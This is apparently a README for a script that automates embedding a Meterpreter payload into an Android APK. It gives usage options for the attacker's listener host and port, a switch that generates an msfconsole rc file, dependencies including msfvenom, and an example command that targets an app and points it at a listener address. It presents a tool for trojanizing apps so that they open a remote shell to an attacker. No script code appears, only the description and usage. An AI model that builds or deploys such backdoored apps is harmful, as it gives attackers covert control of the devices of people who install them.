# DESCRIPTION
Automation of MeterPreter implementation in the APK app
- - -
## HELP
usage: script [options] target

-h help

-p LPORT (default 4444)

-H LHOST (default 192.168.240.1)

-f Option apktool decode..: Force delete destination directory.

-g Generate rc file for msfconsole

\==================================================

Dependencies: pyp, fdfind, msfvenom, ripgrep, uber

## Dependencies:
- pyp
- fdfind
- msfvenom
- ripgrep
- uber

## EXAMPLE
./meterpreter_in_apk.sh -H 192.168.244.44 -p 8844 -g path/to/app.apk

## OUTPUT
![Release header](https://github.com/wanbalan/meterpreter_in_apk/blob/main/screen_001.png?raw=true)
